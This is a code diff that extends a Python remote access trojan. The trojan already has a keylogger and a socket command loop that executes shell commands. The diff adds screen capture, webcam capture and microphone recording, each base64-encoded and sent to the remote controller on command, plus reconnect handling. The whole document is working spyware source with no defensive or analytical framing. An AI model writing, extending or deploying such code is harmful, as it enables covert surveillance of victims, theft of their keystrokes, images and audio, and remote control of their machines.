@@ -6,6 +6,10 @@ import time
 import threading
 import tkinter as tk
 from tkinter import ttk
+import cv2
+import wave
+import pyaudio
+from PIL import ImageGrab
 from keylogger import startKeylogger
 from antiVi import start_application
 
@@ -41,7 +45,66 @@ def read_file(path):
 		content = base64.b64encode(file.read())
 		return content.decode()
 
+def capture_screen():
+    try:
+        screenshot = ImageGrab.grab()
+        screenshot.save("screen.png", "PNG")
+        return read_file("screen.png")
+    except Exception as e:
+        return f"Error capturing screen: {str(e)}"
 
+def capture_webcam():
+    try:
+        cap = cv2.VideoCapture(0)
+        if not cap.isOpened():
+            return "Error: Could not open webcam."
+        ret, frame = cap.read()
+        if ret:
+            cv2.imwrite("webcam.png", frame)
+            cap.release()
+            return read_file("webcam.png")
+        else:
+            cap.release()
+            return "Error: Could not capture frame from webcam."
+    except Exception as e:
+        return f"Error capturing webcam: {str(e)}"
+
+def record_microphone(duration=5):
+    try:
+        CHUNK = 1024
+        FORMAT = pyaudio.paInt16
+        CHANNELS = 1
+        RATE = 44100
+        RECORD_SECONDS = duration
+        
+        audio = pyaudio.PyAudio()
+        stream = audio.open(format=FORMAT, channels=CHANNELS,
+                            rate=RATE, input=True,
+                            frames_per_buffer=CHUNK)
+        
+        print("Recording microphone...")
+        frames = []
+        for i in range(0, int(RATE / CHUNK * RECORD_SECONDS)):
+            data = stream.read(CHUNK)
+            frames.append(data)
+        
+        print("Finished recording.")
+        stream.stop_stream()
+        stream.close()
+        audio.terminate()
+        
+        waveFile = wave.open('microphone.wav', 'wb')
+        waveFile.setnchannels(CHANNELS)
+        waveFile.setsampwidth(audio.get_sample_size(FORMAT))
+        waveFile.setframerate(RATE)
+        waveFile.writeframes(b''.join(frames))
+        waveFile.close()
+        
+        return read_file("microphone.wav")
+    except Exception as e:
+        return f"Error recording microphone: {str(e)}"
+
+# --- RAT Command Handler ---
 def rat_client():
 	s = connect()
 	try:
@@ -79,12 +142,27 @@ def rat_client():
 					s.send(str.encode(read_file("Keylogg.txt")))
 				else:
 					s.send(str.encode("No keylog file found"))
+			elif command == 'screenshot':
+				s.send(str.encode(capture_screen()))
+			elif command == 'webcam':
+
+				s.send(str.encode(capture_webcam()))
+				
+			elif command.startswith('mic '):
+				try:
+					duration = int(command.split(' ')[1])
+				except:
+					duration = 5
+				s.send(str.encode(record_microphone(duration)))
 			else:
 				output = execute_commands(command)
 				s.send(str.encode(output))
-	except Exception as e :
+	except socket.error as e:
+		print(f"Socket error: {e}. Reconnecting...")
+		
+	except Exception as e:
 		print(f"An error occurred: {e}")
-
+		s.send(str.encode(f"Error: {str(e)}"))
 	finally:
 		s.close()
 
@@ -109,6 +187,8 @@ if __name__ == "__main__":
 
 
 		
+                
+
 
         
 
